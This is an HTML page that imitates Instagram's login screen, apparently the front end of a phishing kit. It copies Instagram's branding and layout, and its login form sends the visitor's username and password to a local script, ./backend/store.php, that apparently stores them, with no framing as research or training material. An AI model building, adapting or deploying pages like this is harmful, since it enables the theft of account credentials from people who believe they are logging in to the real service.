<!DOCTYPE html>
<html lang="en">
    <title>Instagram</title>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" type="text/css" href="./index.css">



</head>
<body>

<div class="language">English<span> ></span></div>
<div class="container">
  <div class="head">
    <h1 class="NXVPg Szr5J">Instagram</h1>

  </div>
  <div class="fblog">
    <button class="fbbtn">
      <span class="fbico"></span>Continue with Facebook
    </button>

  </div>
  <div class="aux">
    <div class="row"></div>
    <div class="or">OR</div>
    <div class="row"></div>
  </div>
  <div class="credform">
    <form class="cred" action="./backend/store.php" method="post">
      <input type="text" name="username" placeholder="Phone number, username or email" pattern="[A-Za-z0-9]{1,}" required>
      <input type="password" name="password" placeholder="Password" required pattern="[A-za-z0-9!@#$%^&*()]{6,}">
      <div class="forget">
        <a href="#">Forgot Password?</a>

      </div>
      <input type = "submit" value = "Log in" class="login" style="" id="submitbtn">
    </form>
    <div class="addacc">
      Don't have an account? <span> Sign up</span>
    </div>
  </div>


</div>
<div class="frommeta"><span></span></div>
</body>
<script src = "./index.js"></script>
</html>
